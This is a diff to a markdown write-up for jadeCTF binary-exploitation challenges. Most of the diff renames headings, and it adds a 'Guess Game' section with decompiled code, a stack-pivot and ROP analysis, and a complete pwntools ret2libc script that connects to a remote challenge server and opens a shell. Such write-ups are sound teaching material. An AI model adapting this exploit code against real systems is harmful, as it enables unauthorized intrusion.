@@ -1,4 +1,4 @@
-# BABY PWN
+# Baby Pwn
 We are given a binary.  
 First, run checksec on it:
 ```
@@ -42,7 +42,8 @@ void win(void)
   return;
 }
 ```
-We can overflow the `local_208` variable and call the `win()` function to get the flag. The solve script:
+We can overflow the `local_208` variable and call the `win()` function to get the flag.  
+**solve.py**
 ```py
 from pwn import *
 
@@ -64,7 +65,7 @@ p.interactive()
 ```
 FLAG: `jadeCTF{buff3r_0v3rfl0ws_4r3_d4ng3r0u5}`
 
-# DATA STORAGE
+# Data Storage
 First run checksec on the binary:
 ```
 Arch:     amd64-64-little
@@ -232,7 +233,7 @@ So, our exploit would be like this:
 2. Craft a shellcode which runs /bin/sh.
 3. Enter the shellcode in the buffer, and then overflow it. Enter the canary at the appropriate place, then ret to our shellcode.
 4. Reverse the scrambling part and "de-scramble" this payload, so that when the binary scrambles it, it becomes the original payload.  
-Exploit Script:
+**solve.py**
 ```py
 from pwn import *
 import re
@@ -328,3 +329,213 @@ rm shellcode
 ```
 
 FLAG: `jadeCTF{sh3llc0ding_but_w1th_4_tw1st}`
+
+# Guess Game
+First let's run checksec on the binary:
+```
+Arch:     amd64-64-little
+RELRO:    Partial RELRO
+Stack:    No canary found
+NX:       NX enabled
+PIE:      No PIE (0x400000)
+```
+Now, let's start analyzing the binary on Ghidra. First, we have the `main()` function:
+```c
+undefined8 main(void)
+{
+  uint local_c;
+  
+  setvbuf(stdout,(char *)0x0,2,0);
+  setvbuf(stdin,(char *)0x0,1,0);
+  fill_secret_buffer();
+  write(2,"Welcome to my game, choose any number between 1-10\n",0x33);
+  write(2,"Enter a number: ",0x10);
+  __isoc99_scanf(&DAT_00400f6d,&local_c);
+  getchar();
+  if (((int)local_c < 0xb) && (0 < (int)local_c)) {
+    if ((local_c & 1) == 0) {
+      even_option();
+    }
+    else {
+      odd_option();
+    }
+    write(2,"Bye bye\n",8);
+    return 0;
+  }
+  write(2,"Wrong number entered\n",0x15);
+                    /* WARNING: Subroutine does not return */
+  exit(0);
+}
+```
+It calls the `fill_secret_buffer()` function first.
+```c
+void fill_secret_buffer(void)
+{
+  FILE *__stream;
+  
+  __stream = fopen("secret.txt","r");
+  if (__stream == (FILE *)0x0) {
+    puts("Sorry, secret doesn\'t exist.");
+                    /* WARNING: Subroutine does not return */
+    exit(0);
+  }
+  fgets(secret_buffer,100,__stream);
+  return;
+}
+```
+It just reads a file `secret.txt` and stores its contents in a variable `secret_buffer`. Going back to main, it takes a number as input, then if it's even, calls the `even_option()` function, and if its odd, calls the `odd_option()` function. First, let's see `even_option()`:
+```c
+void even_option(void)
+{
+  size_t sVar1;
+  char local_78 [108];
+  int local_c;
+  
+  write(2,"Enter your name: ",0x11);
+  fgets(local_78,100,stdin);
+  sVar1 = strcspn(local_78,"\r\n");
+  local_78[sVar1] = '\0';
+  local_c = sprintf(temp_buffer,
+                    "Hello %s, we are sorry but you gave us the wrong input. Please try again.\n" ,
+                    local_78);
+  write(2,temp_buffer,(long)local_c);
+  return;
+}
+```
+It just takes an input and prints out a text. Nothing special here. Moving on to `odd_option()`:
+```c
+void odd_option(void)
+{
+  char *pcVar1;
+  char local_148 [208];
+  char local_78 [108];
+  int local_c;
+  
+  write(2,"Let\'s begin, but first here is how you play:\n",0x2d);
+  write(2,"- A number will be shown to you\n",0x20);
+  write(2,"- You have to enter two strings\n",0x20);
+  write(2,"- - The first should be your name\n",0x22);
+  write(2,"- - The second string should be equal to the secret code\n",0x39);
+  write(2,"- If you successfully guess the secret code, you win!\n",0x36);
+  local_c = sprintf(temp_buffer,"\nHere\'s the number: %lld\n",local_148);
+  write(2,temp_buffer,(long)local_c);
+  write(2,"Enter first input please: ",0x1a);
+  fgets(local_148,200,stdin);
+  write(2,"Enter second input please: ",0x1b);
+  fgets(local_78,0x82,stdin);
+  pcVar1 = strcpy(local_78,secret_buffer);
+  if (pcVar1 == (char *)0x0) {
+    write(2,"Congrats! You win!\n",0x13);
+                    /* WARNING: Subroutine does not return */
+    exit(0);
+  }
+  return;
+}
+```
+This function first prints out some text, and then *leaks* the address of `local_148` (our first input buffer), then takes two inputs. It then checks if our second input is equal to the `secret_buffer` variable or not. If it is, then the program exits. Also we have an overflow in the second input, but it's not enough to create a full ROP chain.  
+But we see that we have been provided another input buffer, so we can perform *stack pivoting*. Using that, we can build our ROP chain in the first buffer, and then execute it from there. Next, where should we jump to?  
+On inspecting in Ghidra, we see this function:
+```c
+void hidden_level(int param_1)
+
+{
+  char local_78 [112];
+  
+  write(2,"Oooh! You reached the hidden level, type the mantra to unlock the hidden door:\n",0x4f );
+  fgets(local_78,0x200,stdin);
+  if (param_1 != -0x21524111) {
+    write(2,"Did you cheat?\n",0xf);
+                    /* WARNING: Subroutine does not return */
+    exit(0);
+  }
+  return;
+}
+```
+And we have an overflow here! But, we have to make the `param_1` as -0x21524111. So, we have to use the `pop rdi; ret` gadget and place this value in rdi before calling the function. Next, now that this is done, we have an unrestricted buffer overflow here. Now, the problem here is that we don't have the `puts` function available to us. Instead, we have the `write` function, which takes 3 arguments. If we check the manual for `write`:
+```c
+ssize_t write(int fildes, const void *buf, size_t nbytes);
+```
+We need to provide all these 3 arguments. Hence, we need to fill the `rdi`, `rsi`, and `rdx` registers. Searching for gadgets, we have:
+```s
+0x0000000000400946 : pop rdi ; ret
+0x0000000000400948 : mov rsi, qword ptr [rbp - 0x30] ; ret
+0x0000000000400c81 : pop rsi ; pop r15 ; ret
+0x000000000040094d : pop rdx ; ret
+```  
+  
+**NOTE:** In our writeup, we have used the second gadget for rsi (0x400948) to show how even complex gadgets can be used for ROP chaining, but it will be easier to use the third gadget (0x400c81).
+Using these gadgets, we can pass the appropriate values to the registers, and then call the write function to leak addresses and find the LIBC base, after which, we can perform a simple ret2libc and get a shell.  
+**solve.py**
+```py
+from pwn import *
+
+BINARY = "chall"
+LIBC = "libc.so.6"
+
+context.binary = BINARY
+elf = context.binary
+rop = ROP(elf)
+libc = ELF(LIBC)
+
+# p = elf.process()
+p = remote("34.76.206.46", 10004)
+
+p.sendlineafter(b"Enter a number: ", b"3")
+
+p.recvuntil(b"the number: ")
+leak = int(p.recvline().strip())
+log.info(f"buffer address -> {hex(leak)}")
+log.info(f"hidden level -> {hex(elf.symbols['hidden_level'])}")
+log.info(f"setvbuf got -> {hex(elf.got['setvbuf'])}")
+
+payload = flat(
+    p64(0),
+    p64(rop.find_gadget(["pop rdi", "ret"]).address),
+    p64(0xdeadbeef),
+    p64(elf.symbols["hidden_level"])
+)
+p.sendlineafter(b"first input please: ", payload)
+
+payload = cyclic(0x70)
+payload += p64(leak)
+payload += p64(rop.find_gadget(["leave", "ret"]).address)
+
+p.sendlineafter(b"second input please: ", payload)
+
+log.info(f"address for write to print -> {hex(leak+0x140-0x70+0x30)}")
+
+payload =  cyclic(88)
+payload += p64(elf.got["setvbuf"])
+payload += cyclic(0x70-len(payload))
+payload += p64(leak+0x30)
+payload += p64(0x400948)
+payload += p64(rop.find_gadget(["pop rdi", "ret"]).address)
+payload += p64(2)
+payload += p64(rop.find_gadget(["pop rdx", "ret"]).address)
+payload += p64(8)
+payload += p64(elf.plt["write"])
+payload += p64(rop.find_gadget(["pop rdi", "ret"]).address)
+payload += p64(0xdeadbeef)
+payload += p64(elf.symbols["hidden_level"])
+
+p.sendlineafter(b"unlock the hidden door:\n", payload)
+
+setvbuf_leak = p.recvuntil(b"Oooh!")[:-5]
+setvbuf_leak = u64(setvbuf_leak.ljust(8, b'\x00'))
+
+log.info(f"setvbuf leak -> {hex(setvbuf_leak)}")
+libc_base = setvbuf_leak - libc.symbols["setvbuf"]
+log.info(f"libc base -> {hex(libc_base)}")
+libc.address = libc_base
+
+payload =  cyclic(0x70+8)
+payload += p64(rop.find_gadget(["pop rdi", "ret"]).address)
+payload += p64(next(libc.search(b"/bin/sh")))
+payload += p64(libc.symbols["system"])
+
+p.sendlineafter(b"unlock the hidden door:\n", payload)
+
+p.interactive()
+p.close()
+```  
+FLAG: `jadeCTF{p1v0t!_p1v0t!_p1v0t!}`
